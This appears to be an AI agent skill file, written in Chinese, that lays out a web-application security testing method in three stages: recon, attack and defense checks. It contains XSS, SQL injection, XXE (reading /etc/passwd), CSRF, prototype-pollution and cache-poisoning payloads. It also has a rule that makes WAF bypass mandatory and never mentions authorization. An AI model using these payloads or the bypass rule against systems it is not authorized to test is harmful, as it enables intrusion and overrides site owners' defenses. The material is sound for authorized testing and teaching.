---
name: web-app-security
description: Web应用安全测试三柱法 — 基于Andrew Hoffman《Web Application Security 2nd》(O'Reilly 2025)。侦察→攻击→防御全流程，覆盖XSS/CSRF/SQLi/XXE/SSRF/反序列化/原型污染。
user-invocable: true
---

# Web App Security — Web 应用安全测试

> 基于 Andrew Hoffman《Web Application Security 2nd》(2025)

## 三柱方法论

```
┌──────────┐    ┌──────────┐    ┌──────────┐
│ 侦察      │ →  │ 攻击      │ →  │ 防御      │
│ Recon     │    │ Offense   │    │ Defense   │
└──────────┘    └──────────┘    └──────────┘
 子域名/API        XSS/CSRF        CSP/安全头
 依赖分析          SQLi/XXE        威胁建模
 架构评估          SSRF/IDOR       代码审计
```

---

## §1 侦察 (Reconnaissance)

### 1.1 子域名发现
```bash
subfinder -d target.com -o subs.txt
amass enum -d target.com -o amass.txt
# 合并去重
cat subs.txt amass.txt | sort -u > all_subs.txt
```

### 1.2 第三方依赖分析
```bash
# 从 JS 中提取依赖
curl -s https://target.com/main.js | grep -oP '"[\w-]+":\s*"[^"]+"'
# 检测已知漏洞
npm audit / retire.js
```

### 1.3 API 端点发现
```bash
# 从 JS 中提取 API 路径
curl -s https://target.com/app.js | grep -oP '"/api/[^"]*"'
# 从 Swagger 解析
curl -s https://target.com/swagger.json | jq '.paths | keys[]'
```

### 1.4 架构指纹
```
Server 头       → nginx/Apache/IIS
X-Powered-By    → PHP/ASP.NET/Express
Set-Cookie      → JSESSIONID(Java) / PHPSESSID(PHP) / ASP.NET_SessionId
路径特征        → /wp-admin(WP) / /xje7ec(Ruoyi) / /static/layuiadmin(LayUI)
```

---

## §2 攻击 (Offense)

### 2.1 XSS 测试矩阵
```html
<!-- 基本 -->
<script>alert(1)</script>
<!-- 事件 -->
<img src=x onerror=alert(1)>
<!-- SVG -->
<svg onload=alert(1)>
<!-- URL 协议 -->
<a href="javascript:alert(1)">click</a>
<!-- 编码绕过 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<!-- Unicode -->
<scrİpt>alert(1)</scrİpt>
```

### 2.2 CSRF 检测
```html
<form action="https://target.com/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
  <input type="submit">
</form>
```

### 2.3 SQL 注入
```sql
-- 检测点: 登录框、搜索框、排序参数、分页参数、导出接口
' OR '1'='1
' UNION SELECT NULL--
' AND SLEEP(5)--
admin'--
```

### 2.4 XXE (XML 外部实体)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### 2.5 SSRF 探测参数（28 个）
```
url= src= redirect= callback= next= dest= path=
host= proxy= fetch= load= link= uri= endpoint=
forward= navigate= open= ref= return= site=
target= to= file= resource= continue= domain= out= data=
```

### 2.6 反序列化检测
```
Java:   rO0AB (base64 开头)
.NET:   AAEA (ViewState 开头)
PHP:    O:8:"Class": (序列化对象)
Python: .pickle 文件
```

### 2.7 原型污染 (Prototype Pollution)
```javascript
// 检测
"?__proto__[isAdmin]=true"
"?constructor[prototype][isAdmin]=true"
// JSON
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
```

### 2.8 点击劫持检测
```bash
curl -sI https://target.com | grep -iE "x-frame-options|content-security-policy"
# 无 X-Frame-Options + 无 CSP frame-ancestors = 可点击劫持
```

---

## §3 高级攻击技术

> ⚠️ **若目标有 WAF/IPS**:尝试本节绕过技术(3.1 HTTP 走私 / 3.2 竞态条件 / 3.4 缓存投毒)再放弃。WAF 拦截是常态,不是终点;被拦就降级 = 放弃已确认的绕过面。

### 3.1 HTTP 请求走私
```
CL.TE: Content-Length + Transfer-Encoding 不一致
TE.CL: Transfer-Encoding + Content-Length 不一致
H2.CL: HTTP/2 → HTTP/1.1 降级走私
```

### 3.2 竞态条件 (Race Condition)
```bash
# 并发请求 — 多次使用同一优惠券
for i in {1..50}; do
  curl -X POST https://target.com/redeem -d "code=COUPON" &
done
```

### 3.3 WebSocket 攻击
```
- ws:// 明文通信
- 未认证的连接
- 客户端可控的 userId
- 跨站 WebSocket 劫持
```

### 3.4 缓存投毒
```
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
X-Original-URL: /admin
```

---

## §4 防御验证

### 4.1 安全头检查清单
```
□ Strict-Transport-Security
□ Content-Security-Policy (frame-ancestors 'self')
□ X-Frame-Options: DENY
□ X-Content-Type-Options: nosniff
□ Referrer-Policy: strict-origin-when-cross-origin
□ Permissions-Policy
□ Access-Control-Allow-Origin (不应为 *)
```

### 4.2 Cookie 安全检查
```
□ Secure 标志
□ HttpOnly 标志
□ SameSite=Strict/Lax
□ __Host- 前缀 (防子域覆盖)
□ 无敏感数据明文存储
```

### 4.3 CSP 评估
```bash
# 分析 CSP 强度
curl -sI https://target.com | grep Content-Security-Policy
# 危险: default-src 'self' * 'unsafe-inline' 'unsafe-eval'
# 安全: default-src 'self'; script-src 'self'; frame-ancestors 'none'
```

---

> **参考**: 《Web Application Security 2nd》(O'Reilly 2025) Andrew Hoffman
> **工具链**: Burp Suite / OWASP ZAP / Nuclei / FFUF / SQLMap / jwt_tool

---

## 2026-08-01 实战优化

今日教训固化:

1. **WAF 绕再弃(强制)**:目标有 WAF/IPS 时,完整尝试 §3 高级攻击技术(3.1 HTTP 走私 / 3.2 竞态条件 / 3.4 缓存投毒)再放弃。这三类绕过不依赖 payload 特征,专治 WAF 误拦。**被 WAF 拦 ≠ 漏洞不存在,绕再弃。**
2. **绕过尝试留证据**:每次绕过尝试记录 请求头/响应码/时间差,便于与 src-hunter 方法论 `02-bypass-toolkit.md` 决策树。
3. **数据预筛联动**:提交前抽 3-5 条样本数据搜公网(参考记忆 `public-data-vs-vulnerability`),区分"服务你"vs"关于你"。
4. **OAuth 端点**:遇到 OAuth/OIDC 一律按 `api-security-testing` §2.4 redirect_uri 校验逐条测,再进攻击面。

> **参考**: 《Web Application Security 2nd》(O'Reilly 2025) Andrew Hoffman
> **链**: Burp Suite / OWASP ZAP / Nuclei / FFUF / SQLMap / jwt_tool
